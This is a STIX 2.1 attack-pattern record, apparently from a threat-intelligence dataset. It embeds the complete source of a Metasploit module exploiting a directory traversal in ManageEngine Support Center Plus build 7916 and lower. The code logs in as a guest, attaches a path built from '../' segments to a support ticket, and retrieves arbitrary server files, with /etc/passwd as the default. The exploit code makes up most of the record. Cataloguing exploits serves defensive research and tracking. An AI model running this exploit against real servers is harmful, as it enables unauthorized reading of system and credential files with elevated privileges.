{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f4fda23-9110-4da6-8063-5eaf701ea749",
    "created": "2024-08-14T16:30:14.379785Z",
    "modified": "2024-08-14T16:30:14.379789Z",
    "name": "\"ManageEngine Support Center Plus Directory Traversal\"",
    "description": " This module exploits a directory traversal vulnerability found in ManageEngine Support Center Plus build 7916 and lower. The module will create a support ticket as a normal user, attaching a link to a file on the server. By requesting our own attachment, it's possible to retrieve any file on the filesystem with the same privileges as Support Center Plus is running. On Windows this is always with SYSTEM privileges.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/support_center_plus_directory_traversal.rb",
            "external_id": "support_center_plus_directory_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-100002"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ManageEngine Support Center Plus Directory Traversal\",\n      'Description'    => %q{\n        This module exploits a directory traversal vulnerability found in ManageEngine\n        Support Center Plus build 7916 and lower. The module will create a support ticket\n        as a normal user, attaching a link to a file on the server. By requesting our\n        own attachment, it's possible to retrieve any file on the filesystem with the same\n        privileges as Support Center Plus is running. On Windows this is always with SYSTEM\n        privileges.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'xistence <xistence[at]0x90.nl>', # Discovery, Metasploit module\n      'References'     =>\n        [\n          ['CVE', '2014-100002'],\n          ['EDB', '31262'],\n          ['OSVDB', '102656'],\n          ['BID', '65199'],\n          ['PACKETSTORM', '124975']\n        ],\n      'DisclosureDate' => '2014-01-28'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('TARGETURI', [true, 'The base path to the Support Center Plus installation', '/']),\n        OptString.new('USER', [true, 'The Support Center Plus user', 'guest']),\n        OptString.new('PASS', [true, 'The Support Center Plus password', 'guest']),\n        OptString.new('FILE', [true, 'The Support Center Plus password', '/etc/passwd'])\n      ])\n  end\n\n  def run_host(ip)\n    uri = target_uri.path\n    peer = \"#{ip}:#{rport}\"\n\n    vprint_status(\"Retrieving cookie\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, \"\")\n    })\n\n    if res and res.code == 200\n      session = res.get_cookies\n    else\n      vprint_error(\"Server returned #{res.code.to_s}\")\n    end\n\n    vprint_status(\"Logging in as user [ #{datastore['USER']} ]\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"j_security_check\"),\n      'cookie' => session,\n      'vars_post' =>\n      {\n        'j_username' => datastore['USER'],\n        'j_password' => datastore['PASS'],\n        'logonDomainName' => 'undefined',\n        'sso_status' => 'false',\n        'loginButton' => 'Login'\n      }\n    })\n\n    if res and res.code == 302\n      vprint_status(\"Login succesful\")\n    else\n      vprint_error(\"Login was not succesful!\")\n      return\n    end\n\n    randomname = Rex::Text.rand_text_alphanumeric(10)\n    vprint_status(\"Creating ticket with our requested file [ #{datastore['FILE']} ] as attachment\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"WorkOrder.do\"),\n      'cookie' => session,\n      'vars_post' =>\n        {\n          'reqTemplate' => '',\n          'prodId' => '0',\n          'priority' => '2',\n          'reqID' => '2',\n          'usertypename' => 'Requester',\n          'reqName' => 'Guest',\n          'category' => '0',\n          'item' => '0',\n          'subCategory' => '0',\n          'title' => randomname,\n          'description' => randomname,\n          'MOD_IND' => 'WorkOrder',\n          'FORMNAME' => 'WorkOrderForm',\n          'attach' => \"/../../../../../../../../../../../..#{datastore['FILE']}\",\n          'attPath' => '',\n          'component' => 'Request',\n          'attSize' => Rex::Text.rand_text_numeric(8),\n          'attachments' => randomname,\n          'autoCCList' => '',\n          'addWO' => 'addWO'\n        }\n      })\n\n    if res and res.code == 200\n      vprint_status(\"Ticket created\")\n      if (res.body =~ /FileDownload.jsp\\?module=Request\\&ID=(\\d+)\\&authKey=(.*)\\\" class=/)\n        fileid = $1\n        vprint_status(\"File ID is [ #{fileid} ]\")\n        fileauthkey = $2\n        vprint_status(\"Auth Key is [ #{fileauthkey} ]\")\n      else\n        vprint_error(\"File ID and AuthKey not found!\")\n      end\n    else\n      vprint_error(\"Ticket not created due to error!\")\n      return\n    end\n\n    vprint_status(\"Requesting file [ #{uri}workorder/FileDownload.jsp?module=Request&ID=#{fileid}&authKey=#{fileauthkey} ]\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(uri, \"workorder\", \"FileDownload.jsp\"),\n      'vars_get' =>\n      {\n        'module' => 'Request',\n        'ID' => fileid,\n        'authKey' => fileauthkey\n      }\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.  Print the status code for debugging purposes.\n    if res and res.code == 200\n      data = res.body\n      p = store_loot(\n        'manageengine.supportcenterplus',\n        'application/octet-stream',\n        ip,\n        data,\n        datastore['FILE']\n      )\n      print_good(\"[ #{datastore['FILE']} ] loot stored as [ #{p} ]\")\n    else\n      vprint_error(\"Server returned #{res.code.to_s}\")\n    end\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2014-01-28"
}